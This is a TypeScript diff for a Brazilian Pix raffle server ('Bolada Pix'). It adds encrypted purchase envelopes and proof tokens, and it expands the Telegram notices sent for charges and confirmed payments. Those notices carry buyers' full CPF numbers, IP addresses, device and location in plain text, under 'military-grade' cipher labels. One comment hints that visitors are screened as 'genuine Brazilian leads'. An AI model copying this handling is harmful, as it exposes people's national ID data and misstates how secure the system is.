@@ -4,13 +4,14 @@ import { consumeLastCapturedError } from "./lib/error-capture";
 import { renderErrorPage } from "./lib/error-page";
 import { getRifaConfig, logActivity, type ActivityEvent } from "./lib/rifa-store";
 import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery } from "./lib/telegram-bot";
-import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS } from "./lib/security-shield";
+import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS, buildSecureErrorResponse } from "./lib/security-shield";
 import { extractLeadProfile } from "./lib/lead-profiler";
 import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
 import { getSecret } from "./lib/vault-shield";
-import { generateEncryptedTickets, formatTicketsAsTxt, type GeneratedTicket } from "./lib/ticket-generator";
+import { generateEncryptedTickets, formatTicketsAsTxt, formatTicketsForTelegram, type GeneratedTicket } from "./lib/ticket-generator";
 import { decryptRouteParam } from "./lib/crypto-routes";
 import { formatBrasiliaTime, formatBrasiliaDate } from "./lib/date-utils";
+import { encryptPurchaseData, generatePurchaseProofToken } from "./lib/purchase-cipher";
 
 type ServerEntry = {
   fetch: (request: Request, env: unknown, ctx: unknown) => Promise<Response> | Response;
@@ -72,10 +73,7 @@ export default {
         );
       }
 
-      return new Response(JSON.stringify({ error: securityCheck.reason }), {
-        status: 403,
-        headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
-      });
+      return buildSecureErrorResponse(securityCheck.reason);
     }
 
     // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
@@ -306,6 +304,22 @@ export default {
           ? digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
           : (payload.payerDocument || "Não informado");
 
+        // Criptografia militar de cada compra com envelope AES-256-GCM + HMAC
+        const approxTickets = Math.max(1, Math.round((Number(payload.amount) || 20.70) / (getRifaConfig().ticketPrice || 0.69)));
+        const proofToken = generatePurchaseProofToken(chargeResult.transactionId, digitsOnly, approxTickets);
+        const encryptedEnvelope = encryptPurchaseData({
+          txId: chargeResult.transactionId,
+          amount: chargeResult.amount,
+          payerName: payload.payerName,
+          payerDocument: formattedCpf,
+          clientIp,
+          city: profile.city,
+          state: profile.state,
+          device: profile.device,
+          provider: chargeResult.provider,
+          createdAt: new Date().toISOString(),
+        });
+
         storeTransactionLead(
           chargeResult.transactionId,
           {
@@ -320,7 +334,9 @@ export default {
             os: profile.os,
           },
           chargeResult.amount,
-          chargeResult.provider
+          chargeResult.provider,
+          encryptedEnvelope,
+          proofToken
         );
 
         logActivity({
@@ -332,6 +348,7 @@ export default {
             fee: chargeResult.estimatedFee,
             netAmount: chargeResult.netAmount,
             cpf: formattedCpf,
+            proofToken,
           },
           ip: clientIp,
           state: profile.state,
@@ -353,10 +370,16 @@ export default {
           `• <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
           `• <b>IP Completo:</b> <code>${clientIp}</code>\n` +
           `📅 <b>Data/Hora:</b> <code>${dateStr} às ${timeStr}</code>\n` +
+          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
+          `🛡️ <b>Assinatura Cifra:</b> <code>AES-256-GCM (HMAC: ${encryptedEnvelope.signature.substring(0, 16)}...)</code>\n` +
           `🆔 <b>ID da Transação:</b> <code>${chargeResult.transactionId}</code>`
         );
 
-        return new Response(JSON.stringify(chargeResult), {
+        return new Response(JSON.stringify({
+          ...chargeResult,
+          proofToken,
+          encryptedSignature: encryptedEnvelope.signature,
+        }), {
           headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
         });
       } catch (err: unknown) {
@@ -390,6 +413,31 @@ export default {
           (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
         }
 
+        // Criptografia militar permanente da compra confirmada
+        const cpfRaw = String(lead?.cpf || "").replace(/\D/g, "");
+        const proofToken = leadRecord?.proofToken || generatePurchaseProofToken(txId, cpfRaw, tickets.length);
+        const encryptedEnvelope = encryptPurchaseData({
+          txId,
+          amount,
+          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
+          leadName: lead?.name || "Participante",
+          leadCpf: lead?.cpf || "Não informado",
+          gateway: "União 7 Pay",
+          confirmedAt: new Date().toISOString(),
+          proofToken,
+        });
+
+        if (lead) {
+          storeTransactionLead(
+            txId,
+            lead,
+            amount,
+            "União 7 Pay",
+            encryptedEnvelope,
+            proofToken
+          );
+        }
+
         logActivity({
           type: "pagamento_confirmado",
           data: {
@@ -400,6 +448,7 @@ export default {
             cpf: lead?.cpf,
             rifas: ticketQty,
             tickets: tickets.map((t) => t.code),
+            proofToken,
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -408,35 +457,55 @@ export default {
 
         const timeStr = formatBrasiliaTime();
         const dateStr = formatBrasiliaDate();
-        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
-          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");
 
+        // 1. Mensagem principal de confirmação com dados do lead e recibo criptográfico
         await sendTelegramNotification(
-          `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
-          `🏦 <b>Gateway Responsável:</b> <code>União 7 Pay</code>\n` +
+          `🎉 <b>COMPRA CONFIRMADA — BOLADA PIX!</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🏦 <b>Gateway:</b> <code>União 7 Pay</code>\n` +
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
-          `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
-          `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
-          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
-          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
-          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
-          `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
-          `• <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
-          `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
-          `• <b>Localização:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
-          `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
-          `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
-          `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
-          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
+          `📉 <b>Taxa:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
+          `💵 <b>LÍQUIDO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🎟️ <b>TOTAL DE COTAS:</b> <b>${tickets.length} números</b>\n` +
+          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
+          `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>DADOS DO LEAD:</b>\n` +
+          `  • <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
+          `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+          `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
+          `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
+          `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `📅 <b>Aprovado em:</b> <code>${dateStr} às ${timeStr}</code>\n` +
+          `🆔 <b>TxID:</b> <code>${txId}</code>`,
           {
             replyMarkup: {
               inline_keyboard: [
-                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
+                [{ text: `🚫 Banir Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                 [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
               ],
             },
           }
         );
+
+        // 2. Envio organizado e estruturado de TODOS os números em colunas (sem estourar caracteres)
+        const ticketChunks = formatTicketsForTelegram(tickets);
+        for (let i = 0; i < ticketChunks.length; i++) {
+          const partHeader = ticketChunks.length > 1 ? ` (Parte ${i + 1}/${ticketChunks.length})` : "";
+          await sendTelegramNotification(
+            `🎟️ <b>NÚMEROS OFICIAIS DO SORTEIO${partHeader}</b>\n` +
+            `🆔 <b>TxID:</b> <code>${txId}</code>\n` +
+            `👤 <b>Lead:</b> ${lead?.name || "Participante"} | <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+            `📦 <b>Total de Cotas:</b> ${tickets.length} números concorrendo\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+            ticketChunks[i] +
+            `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🔐 <b>Recibo:</b> <code>${proofToken}</code>\n` +
+            `🛡️ <i>Criptografado com AES-256-GCM e assinado com HMAC-SHA256</i>`
+          );
+        }
       }
       return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
     }
@@ -458,6 +527,31 @@ export default {
           (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
         }
 
+        // Criptografia militar permanente da compra confirmada
+        const cpfRaw = String(lead?.cpf || "").replace(/\D/g, "");
+        const proofToken = leadRecord?.proofToken || generatePurchaseProofToken(txId, cpfRaw, tickets.length);
+        const encryptedEnvelope = encryptPurchaseData({
+          txId,
+          amount,
+          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
+          leadName: body.payerName || lead?.name || "Participante",
+          leadCpf: lead?.cpf || "Não informado",
+          gateway: "Elite PAYbr",
+          confirmedAt: new Date().toISOString(),
+          proofToken,
+        });
+
+        if (lead) {
+          storeTransactionLead(
+            txId,
+            lead,
+            amount,
+            "Elite PAYbr",
+            encryptedEnvelope,
+            proofToken
+          );
+        }
+
         logActivity({
           type: "pagamento_confirmado",
           data: {
@@ -468,6 +562,7 @@ export default {
             cpf: lead?.cpf,
             rifas: ticketQty,
             tickets: tickets.map((t) => t.code),
+            proofToken,
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -476,35 +571,55 @@ export default {
 
         const timeStr = formatBrasiliaTime();
         const dateStr = formatBrasiliaDate();
-        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
-          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");
 
+        // 1. Mensagem principal de confirmação com dados do lead e recibo criptográfico
         await sendTelegramNotification(
-          `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
-          `🏦 <b>Gateway Responsável:</b> <code>Elite PAYbr (Reserva)</code>\n` +
+          `🎉 <b>COMPRA CONFIRMADA — BOLADA PIX!</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🏦 <b>Gateway:</b> <code>Elite PAYbr (Reserva)</code>\n` +
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
-          `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
-          `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
-          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
-          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
-          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
-          `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
-          `• <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
-          `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
-          `• <b>Localização:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
-          `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
-          `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
-          `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
-          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
+          `📉 <b>Taxa:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
+          `💵 <b>LÍQUIDO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🎟️ <b>TOTAL DE COTAS:</b> <b>${tickets.length} números</b>\n` +
+          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
+          `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>DADOS DO LEAD:</b>\n` +
+          `  • <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
+          `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+          `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
+          `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
+          `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `📅 <b>Aprovado em:</b> <code>${dateStr} às ${timeStr}</code>\n` +
+          `🆔 <b>TxID:</b> <code>${txId}</code>`,
           {
             replyMarkup: {
               inline_keyboard: [
-                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
+                [{ text: `🚫 Banir Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                 [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
               ],
             },
           }
         );
+
+        // 2. Envio organizado e estruturado de TODOS os números em colunas
+        const ticketChunks = formatTicketsForTelegram(tickets);
+        for (let i = 0; i < ticketChunks.length; i++) {
+          const partHeader = ticketChunks.length > 1 ? ` (Parte ${i + 1}/${ticketChunks.length})` : "";
+          await sendTelegramNotification(
+            `🎟️ <b>NÚMEROS OFICIAIS DO SORTEIO${partHeader}</b>\n` +
+            `🆔 <b>TxID:</b> <code>${txId}</code>\n` +
+            `👤 <b>Lead:</b> ${body.payerName || lead?.name || "Participante"} | <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+            `📦 <b>Total de Cotas:</b> ${tickets.length} números concorrendo\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+            ticketChunks[i] +
+            `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🔐 <b>Recibo:</b> <code>${proofToken}</code>\n` +
+            `🛡️ <i>Criptografado com AES-256-GCM e assinado com HMAC-SHA256</i>`
+          );
+        }
       }
       return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
     }
